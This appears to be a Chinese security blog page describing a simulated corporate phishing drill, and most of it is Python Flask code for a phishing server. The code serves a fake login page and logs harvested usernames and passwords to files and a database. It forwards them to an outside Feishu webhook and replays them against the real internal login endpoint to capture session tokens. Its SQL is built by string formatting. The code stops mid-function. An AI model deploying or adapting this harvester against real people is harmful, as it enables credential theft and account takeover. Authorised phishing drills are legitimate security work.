@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>企业内部模拟钓鱼演练 | z0@ServSec</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="最近对企业需要做钓鱼演练于是写了一个，具体细节下次详细写一下&#x3D;。&#x3D;，update 思路如下：  1.flask-fishing-db12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717">
+<meta property="og:type" content="article">
+<meta property="og:title" content="企业内部模拟钓鱼演练">
+<meta property="og:url" content="https://z0edff0x3d.github.io/2022/04/08/%E4%BC%81%E4%B8%9A%E5%86%85%E9%83%A8%E6%A8%A1%E6%8B%9F%E9%92%93%E9%B1%BC%E6%BC%94%E7%BB%83/index.html">
+<meta property="og:site_name" content="z0@ServSec">
+<meta property="og:description" content="最近对企业需要做钓鱼演练于是写了一个，具体细节下次详细写一下&#x3D;。&#x3D;，update 思路如下：  1.flask-fishing-db12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://z0edff0x3d.github.io/2022/04/08/%E4%BC%81%E4%B8%9A%E5%86%85%E9%83%A8%E6%A8%A1%E6%8B%9F%E9%92%93%E9%B1%BC%E6%BC%94%E7%BB%83/image-20220413110029985.png">
+<meta property="article:published_time" content="2022-04-08T09:49:30.000Z">
+<meta property="article:modified_time" content="2022-04-13T03:00:34.759Z">
+<meta property="article:author" content="z0edff0x3d">
+<meta property="article:tag" content="安全开发">
+<meta property="article:tag" content="Python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://z0edff0x3d.github.io/2022/04/08/%E4%BC%81%E4%B8%9A%E5%86%85%E9%83%A8%E6%A8%A1%E6%8B%9F%E9%92%93%E9%B1%BC%E6%BC%94%E7%BB%83/image-20220413110029985.png">
+  
+    <link rel="alternative" href="/atom.xml" title="z0@ServSec" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="/img/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">z0edff0x3d</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/Blog/" style="font-size: 10px;">Blog</a> <a href="/tags/GO/" style="font-size: 15px;">GO</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/Mac/" style="font-size: 10px;">Mac</a> <a href="/tags/Python/" style="font-size: 17.5px;">Python</a> <a href="/tags/SBOM/" style="font-size: 10px;">SBOM</a> <a href="/tags/SCA/" style="font-size: 10px;">SCA</a> <a href="/tags/vCenter/" style="font-size: 12.5px;">vCenter</a> <a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/" style="font-size: 10px;">云原生</a> <a href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" style="font-size: 20px;">安全开发</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 12.5px;">渗透测试</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 10px;">生活</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="/">以下排名不分先后</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://g0uz1.github.io/">g0uz1(大哥)</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a pentester.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="/img/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-企业内部模拟钓鱼演练" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2022/04/08/%E4%BC%81%E4%B8%9A%E5%86%85%E9%83%A8%E6%A8%A1%E6%8B%9F%E9%92%93%E9%B1%BC%E6%BC%94%E7%BB%83/" class="article-date">
+  	<time datetime="2022-04-08T09:49:30.000Z" itemprop="datePublished">2022-04-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      企业内部模拟钓鱼演练
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" rel="tag">安全开发</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近对企业需要做钓鱼演练于是写了一个，具体细节下次详细写一下=。=，update</p>
+<p>思路如下：</p>
+<p><img src="/2022/04/08/%E4%BC%81%E4%B8%9A%E5%86%85%E9%83%A8%E6%A8%A1%E6%8B%9F%E9%92%93%E9%B1%BC%E6%BC%94%E7%BB%83/image-20220413110029985.png" alt="image-20220413110029985"></p>
+<h3 id="1-flask-fishing-db"><a href="#1-flask-fishing-db" class="headerlink" title="1.flask-fishing-db"></a>1.flask-fishing-db</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,jsonify,render_template,make_response</span><br><span class="line"><span class="keyword">import</span> requests,hashlib</span><br><span class="line"><span class="keyword">from</span> flask_cors <span class="keyword">import</span> CORS</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> logging.config</span><br><span class="line"><span class="keyword">import</span> termcolor</span><br><span class="line"></span><br><span class="line"><span class="comment">#日志记录参考https://juejin.cn/post/7035203154035605535</span></span><br><span class="line"><span class="comment">#坑点，看到的日志是有werkzeug记录的并不是flask自己记录的</span></span><br><span class="line"><span class="comment">#将日志写入文件的配置示例，当日志文件大小大于 10M 后，就用一个新的文件来存放日志，总的日志文件数目是50个。debug 的信息写入 debug.log，info 的信息写入 info.log，error 的信息写入 error.log。</span></span><br><span class="line"><span class="comment">#1.如果开启日志配置，建议用terminal模式</span></span><br><span class="line"><span class="comment">#2.如果不开启日志，本地debug模式，可以释掉日志配置</span></span><br><span class="line"><span class="comment"># logging.config.dictConfig(</span></span><br><span class="line"><span class="comment">#     &#123;</span></span><br><span class="line"><span class="comment">#         &quot;version&quot;: 1,</span></span><br><span class="line"><span class="comment">#         &quot;disable_existing_loggers&quot;: False,</span></span><br><span class="line"><span class="comment">#         &quot;formatters&quot;: &#123;</span></span><br><span class="line"><span class="comment">#             &quot;simple&quot;: &#123;&quot;format&quot;: &quot;%(asctime)s - %(name)s - %(levelname)s - %(message)s&quot;&#125;</span></span><br><span class="line"><span class="comment">#         &#125;,</span></span><br><span class="line"><span class="comment">#         &quot;handlers&quot;: &#123;</span></span><br><span class="line"><span class="comment">#             &quot;console&quot;: &#123;</span></span><br><span class="line"><span class="comment">#                 &quot;class&quot;: &quot;logging.StreamHandler&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;level&quot;: &quot;DEBUG&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;formatter&quot;: &quot;simple&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;stream&quot;: &quot;ext://sys.stdout&quot;,</span></span><br><span class="line"><span class="comment">#             &#125;,</span></span><br><span class="line"><span class="comment">#             &quot;info_file_handler&quot;: &#123;</span></span><br><span class="line"><span class="comment">#                 &quot;class&quot;: &quot;logging.handlers.RotatingFileHandler&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;level&quot;: &quot;INFO&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;formatter&quot;: &quot;simple&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;filename&quot;: &quot;info.log&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;maxBytes&quot;: 10485760,</span></span><br><span class="line"><span class="comment">#                 &quot;backupCount&quot;: 50,</span></span><br><span class="line"><span class="comment">#                 &quot;encoding&quot;: &quot;utf8&quot;,</span></span><br><span class="line"><span class="comment">#             &#125;,</span></span><br><span class="line"><span class="comment">#             &quot;error_file_handler&quot;: &#123;</span></span><br><span class="line"><span class="comment">#                 &quot;class&quot;: &quot;logging.handlers.RotatingFileHandler&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;level&quot;: &quot;ERROR&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;formatter&quot;: &quot;simple&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;filename&quot;: &quot;errors.log&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;maxBytes&quot;: 10485760,</span></span><br><span class="line"><span class="comment">#                 &quot;backupCount&quot;: 20,</span></span><br><span class="line"><span class="comment">#                 &quot;encoding&quot;: &quot;utf8&quot;,</span></span><br><span class="line"><span class="comment">#             &#125;,</span></span><br><span class="line"><span class="comment">#             &quot;debug_file_handler&quot;: &#123;</span></span><br><span class="line"><span class="comment">#                 &quot;class&quot;: &quot;logging.handlers.RotatingFileHandler&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;level&quot;: &quot;DEBUG&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;formatter&quot;: &quot;simple&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;filename&quot;: &quot;debug.log&quot;,</span></span><br><span class="line"><span class="comment">#                 &quot;maxBytes&quot;: 10485760,</span></span><br><span class="line"><span class="comment">#                 &quot;backupCount&quot;: 50,</span></span><br><span class="line"><span class="comment">#                 &quot;encoding&quot;: &quot;utf8&quot;,</span></span><br><span class="line"><span class="comment">#             &#125;,</span></span><br><span class="line"><span class="comment">#         &#125;,</span></span><br><span class="line"><span class="comment">#         &quot;loggers&quot;: &#123;</span></span><br><span class="line"><span class="comment">#             &quot;my_module&quot;: &#123;&quot;level&quot;: &quot;ERROR&quot;, &quot;handlers&quot;: [&quot;console&quot;], &quot;propagate&quot;: &quot;no&quot;&#125;</span></span><br><span class="line"><span class="comment">#         &#125;,</span></span><br><span class="line"><span class="comment">#         &quot;root&quot;: &#123;</span></span><br><span class="line"><span class="comment">#             &quot;level&quot;: &quot;DEBUG&quot;,</span></span><br><span class="line"><span class="comment">#             &quot;handlers&quot;: [&quot;error_file_handler&quot;, &quot;debug_file_handler&quot;],</span></span><br><span class="line"><span class="comment">#         &#125;,</span></span><br><span class="line"><span class="comment">#     &#125;</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"></span><br><span class="line">template_folder=<span class="string">&quot;HRIS/templates&quot;</span><span class="comment">#把需要用的静态页面放在这里</span></span><br><span class="line">static_folder=<span class="string">&quot;HRIS/static&quot;</span></span><br><span class="line">static_url_path=<span class="string">&quot;&quot;</span></span><br><span class="line">app =Flask(__name__ ,template_folder=template_folder,static_folder=static_folder,static_url_path=static_url_path)</span><br><span class="line">cors =CORS(app,resource=&#123;<span class="string">r&quot;/*&quot;</span>:&#123;<span class="string">&quot;origins&quot;</span>:<span class="string">&quot;*&quot;</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>,methods=[<span class="string">&quot;get&quot;</span>,<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;Loginx.aspx.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index&quot;</span>,methods=[<span class="string">&quot;get&quot;</span>,<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index2</span>():</span><span class="comment">#randomid通过邮件发送，一个用户一个randomid方便后期识别谁点击了</span></span><br><span class="line">    conn = sqlite3.connect(<span class="string">&quot;fishing.db&quot;</span>)</span><br><span class="line">    cu = conn.cursor()</span><br><span class="line">    randomid = request.args.get(<span class="string">&quot;randomid&quot;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    host = <span class="built_in">str</span>(request.remote_addr)</span><br><span class="line">    timestart = datetime.datetime.now()</span><br><span class="line">    cu.execute(<span class="string">&quot;insert into randomid(host,randomid,timestart)values(&#x27;%s&#x27;,&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;</span> % (host, randomid, timestart))</span><br><span class="line">    conn.commit()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;Loginx.aspx.html&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index.aspx&quot;</span>,methods=[<span class="string">&quot;get&quot;</span>,<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index3</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;Loginx.aspx.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/fishhook&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    conn = sqlite3.connect(<span class="string">&quot;fishing.db&quot;</span>)</span><br><span class="line">    c = conn.cursor()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    usr=request.args.get(<span class="string">&#x27;usr&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    pwd=request.args.get(<span class="string">&#x27;pwd&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    host=<span class="built_in">str</span>(request.remote_addr)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;suc.txt&quot;</span>,<span class="string">&quot;a+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;[INFO]有鱼在尝试：&quot;</span>+host+<span class="string">&quot;-&quot;</span>+usr+<span class="string">&quot;:&quot;</span>+pwd+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    message=<span class="string">&quot;[INFO]有鱼在尝试：&quot;</span>+host+<span class="string">&quot;-&quot;</span>+usr+<span class="string">&quot;:&quot;</span>+pwd</span><br><span class="line">    keyword=usr+<span class="string">&quot;:&quot;</span>+pwd</span><br><span class="line">    timestart=datetime.datetime.now()</span><br><span class="line">    c.execute(<span class="string">&quot;insert into info(host,keyword,timestart)values(&#x27;%s&#x27;,&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;</span> % (</span><br><span class="line">    host,keyword,timestart))</span><br><span class="line">    conn.commit()</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;https://open.feishu.cn/open-apis/bot/v2/hook/******&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    payload_message = &#123;</span><br><span class="line">        <span class="string">&quot;msg_type&quot;</span>: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;text&quot;</span>: message</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=json.dumps(payload_message))</span><br><span class="line">    <span class="comment"># return response</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;p&gt;hello world&lt;/p&gt;&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/checksuc&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checksuc</span>():</span></span><br><span class="line">    conn = sqlite3.connect(<span class="string">&quot;fishing.db&quot;</span>)</span><br><span class="line">    ck = conn.cursor()</span><br><span class="line">    usr = request.args.get(<span class="string">&#x27;usr&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    pwd = request.args.get(<span class="string">&#x27;pwd&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    host = <span class="built_in">str</span>(request.remote_addr)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/plain, */*&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://******&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X -1_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=UTF-8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://******/login?redirect=%2FITSM%2Fworkflow%2FallTickets%2FallTickets&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Forward-For&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = <span class="string">&#x27;&#123;&quot;username&quot;:&quot;&#x27;</span>+usr+<span class="string">&#x27;&quot;,&quot;password&quot;:&quot;&#x27;</span>+pwd+<span class="string">&#x27;&quot;,&quot;code&quot;:&quot;&quot;,&quot;randomid&quot;:&quot;&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">    respx = requests.post(<span class="string">&#x27;http://******/cms/v1/login&#x27;</span>, headers=headers, data=data, verify=<span class="literal">False</span>,timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">print</span>(respx.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;access_token&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> respx.text:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;status&#x27;</span>:<span class="string">&#x27;fail&#x27;</span>&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&quot;finall.txt&quot;</span>,<span class="string">&quot;a+&quot;</span>) <span class="keyword">as</span> ff:</span><br><span class="line">            ff.write(<span class="string">&quot;[BOOM]有鱼上钩！！！！！！！！！！：&quot;</span>+host+<span class="string">&quot;-&quot;</span>+usr+<span class="string">&quot;:&quot;</span>+pwd+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            ff.write(respx.text+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            ff.write(<span class="string">&#x27;======================&#x27;</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        message2=<span class="string">&quot;[BOOM]有鱼上钩！！！！！！！！！！：&quot;</span>+host+<span class="string">&quot;-&quot;</span>+usr+<span class="string">&quot;:&quot;</span>+pwd</span><br><span class="line">        session_devops=respx.text</span><br><span class="line">        timestart = datetime.datetime.now()</span><br><span class="line">        ck.execute(<span class="string">&quot;insert into boom(host,usr,pwd,timestart,session_devops)values(&#x27;%s&#x27;,&#x27;%s&#x27;,&#x27;%s&#x27;,&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;</span> % (</span><br><span class="line">            host, usr,pwd,timestart,session_devops))</span><br><span class="line">        conn.commit()</span><br><span class="line">        url = <span class="string">&quot;https://open.feishu.cn/open-apis/bot/v2/hook/******&quot;</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        payload_message2 = &#123;</span><br><span class="line">            <span class="string">&quot;msg_type&quot;</span>: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">            <span class="string">&quot;content&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;text&quot;</span>: message2</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.request(<span class="string">&quot;POST&quot;</span>, url, headers=headers, data=json.dumps(payload_message2),timeout=<span class="number">3</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># return response</span></span><br><span class="line">        <span class="comment">#return jsonify(&#123; &#x27;status&#x27;: 0, &#x27;message&#x27;: &#x27;success&#x27;, &#x27;data&#x27;: &#x27;登录成功&#x27; &#125;)</span></span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;status&#x27;</span>:<span class="string">&#x27;success&#x27;</span>&#125;)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat_db</span>():</span></span><br><span class="line">    conn = sqlite3.connect(<span class="string">&quot;fishing.db&quot;</span>)</span><br><span class="line">    c = conn.cursor()</span><br><span class="line">    symbol_info = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">    symbol_boom = <span class="string">&#x27;boom&#x27;</span></span><br><span class="line">    symbol_randomid=<span class="string">&#x27;randomid&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c.execute(</span><br><span class="line">            <span class="string">&#x27;create table IF NOT EXISTS %s(id integer PRIMARY KEY autoincrement,host varchar(255),keyword varchar(255) ,timestart varchar (255))&#x27;</span> % symbol_info)</span><br><span class="line">        <span class="comment"># 提交到数据库</span></span><br><span class="line">        conn.commit()</span><br><span class="line">        c.execute(</span><br><span class="line">            <span class="string">&#x27;create table IF NOT EXISTS %s(id integer PRIMARY KEY autoincrement,host varchar(255),usr varchar(255) ,pwd varchar (255),timestart varchar (255),session_devops varchar(9999))&#x27;</span> % symbol_boom)</span><br><span class="line">        <span class="comment"># 提交到数据库</span></span><br><span class="line">        conn.commit()</span><br><span class="line">        c.execute(</span><br><span class="line">            <span class="string">&#x27;create table IF NOT EXISTS %s(id integer PRIMARY KEY autoincrement,host varchar(255),randomid varchar(255),timestart varchar (255))&#x27;</span> % symbol_randomid)</span><br><span class="line">        <span class="comment"># 提交到数据库</span></span><br><span class="line">        conn.commit()</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(termcolor.colored(<span class="string">&#x27;Create table Successful!&#x27;</span>,<span class="string">&quot;green&quot;</span>))</span><br><span class="line">    <span class="keyword">except</span> Exception <span 